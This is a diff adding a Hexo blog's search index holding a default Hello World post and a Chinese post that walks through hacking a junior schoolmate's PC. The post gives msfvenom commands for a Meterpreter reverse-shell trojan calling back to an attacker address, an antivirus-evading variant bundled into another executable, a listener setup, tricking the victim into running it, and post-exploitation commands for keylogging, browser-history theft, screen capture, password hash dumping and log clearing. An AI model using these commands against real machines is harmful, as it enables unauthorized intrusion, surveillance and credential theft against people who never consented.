@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello World</title>
+    <url>/2020/07/31/hello-world/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>记一次内网渗透学弟的电脑</title>
+    <url>/2020/07/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E5%BC%9F%E7%9A%84%E7%94%B5%E8%84%91/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0x01-原因"><a href="#0x01-原因" class="headerlink" title="0x01 原因"></a>0x01 原因</h1><p>emmm…这个就不说了哈哈 懂得都懂</p>
+<p><img src="https://s1.ax1x.com/2020/08/02/atMGTI.gif"></p>
+<h1 id="0x02-准备环境"><a href="#0x02-准备环境" class="headerlink" title="0x02 准备环境"></a>0x02 准备环境</h1><p>攻击机：kali</p>
+<p>靶机：学弟的Pc</p>
+<h2 id="开始制作木马"><a href="#开始制作木马" class="headerlink" title="开始制作木马"></a>开始制作木马</h2><p>裸奔木马</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.9.70 LPORT=3333 -f exe &gt; /root/test.exe</code></p>
+<p>免杀木马</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.9.70 LPORT=3333 -e x86/shikata_ga_nai -x caidao.exe -i 12 -f exe -o /var/www/html/caidao.exe</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th align="center">备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-e</td>
+<td align="center">指定编码方式对攻击载荷进行重新编译</td>
+</tr>
+<tr>
+<td>-x</td>
+<td align="center">指定木马捆绑在哪个可执行程序模版上</td>
+</tr>
+<tr>
+<td>-i</td>
+<td align="center">指定对目标编码的次数，多次编码理论上来讲有助于免杀</td>
+</tr>
+<tr>
+<td>-f</td>
+<td align="center">指定MSF编码器输出的程序格式</td>
+</tr>
+<tr>
+<td>-o</td>
+<td align="center">指定处理完毕后的文件输出路径</td>
+</tr>
+</tbody></table>
+<p><img src="https://s1.ax1x.com/2020/08/02/atM80A.png"></p>
+<p>把木马放到html下</p>
+<p><img src="https://s1.ax1x.com/2020/08/02/atMlOH.png"></p>
+<h2 id="运行msf监听模块"><a href="#运行msf监听模块" class="headerlink" title="运行msf监听模块"></a>运行msf监听模块</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;shell_reverse_tcp</span><br><span class="line">set LHOST 172.18.9.70</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-开始攻击"><a href="#0x03-开始攻击" class="headerlink" title="0x03 开始攻击"></a>0x03 开始攻击</h1><p>首先先诱导学弟点开链接并下载执行木马</p>
+<p><img src="https://s1.ax1x.com/2020/08/02/atMQ6e.png"></p>
+<p>当学弟执行木马文件后 获得shell</p>
+<p><img src="https://s1.ax1x.com/2020/08/02/atM3md.png"></p>
+<h1 id="0x04-获得shell之后的操作"><a href="#0x04-获得shell之后的操作" class="headerlink" title="0x04 获得shell之后的操作"></a>0x04 获得shell之后的操作</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter下的命令：</span><br><span class="line">getwd 当前目录</span><br><span class="line">dir 查看所有文件</span><br><span class="line">cat c:\123.txt 查看文件123.txt内容（数据是字符串传递，所以加一个转义字符\）</span><br><span class="line">search -f cmd.exe （搜索名为cmd.exe文件所在目录）</span><br><span class="line">upload /root/桌面/backldoor.exe（要上传的文件） -&gt; c:\（上传到的目录） 上传文件</span><br><span class="line">download c:\123txt /root 下载文件</span><br><span class="line">clearev 清除日志</span><br><span class="line">getuid 当前用户</span><br><span class="line">ps 查看所用进程</span><br><span class="line">kill 杀死某个进程</span><br><span class="line">sysinfo 系统信息</span><br><span class="line"></span><br><span class="line">键盘记录</span><br><span class="line">keyscan_start 开始键盘记录</span><br><span class="line">keyscan_dump 查看结果</span><br><span class="line">keyscan_stop</span><br><span class="line"></span><br><span class="line">获取浏览器记录</span><br><span class="line">run post/windows/gather/forensics/browser_history</span><br><span class="line">打开拷贝到本地的文件</span><br><span class="line">/root/.msf4/local/aiyou_Firefox_wqsz7fg5.default-release_places.sqlite</span><br><span class="line">查看记录SELECT url FROM moz_places</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">屏幕截图</span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line">屏幕监控</span><br><span class="line">run vnc</span><br><span class="line"></span><br><span class="line">获取密文密码</span><br><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line">获取shell，进入cmd</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>学弟：跟人沾边的事你一点都不干</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+</search>
